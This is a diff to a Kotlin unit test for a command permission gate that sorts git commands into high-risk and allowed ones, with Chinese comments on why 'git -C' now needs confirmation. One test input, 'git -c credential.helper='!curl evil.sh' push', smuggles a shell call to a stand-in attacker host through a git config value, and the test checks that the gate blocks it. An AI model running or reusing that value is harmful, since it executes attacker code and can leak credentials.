@@ -45,7 +45,10 @@ class CommandPermissionGateGitPatternsTest {
         val gate = CommandPermissionGate(gateway)
         assertFalse(gate.ensureAllowed("git config --global user.name x"))
         assertFalse(gate.ensureAllowed("git -c credential.helper='!curl evil.sh' push"))
-        assertEquals(2, gateway.askCount)
+        // isHighRisk 对命令 lowercase 后匹配,"git -C <dir>" 与 "git -c <k=v>"
+        // 在子串级无法区分——跨仓 -C 一并保守确认(码内精确分类在 GitCommandPolicy)
+        assertFalse(gate.ensureAllowed("git -C repo pull"))
+        assertEquals(3, gateway.askCount)
     }
 
     @Test
@@ -57,7 +60,6 @@ class CommandPermissionGateGitPatternsTest {
             "git add -A && git commit -m fix",
             "git push origin feat/x",
             "git log --oneline",
-            "git -C repo pull",
         ).forEach { cmd ->
             assertTrue("常规 git 命令应直通: $cmd", gate.ensureAllowed(cmd))
         }
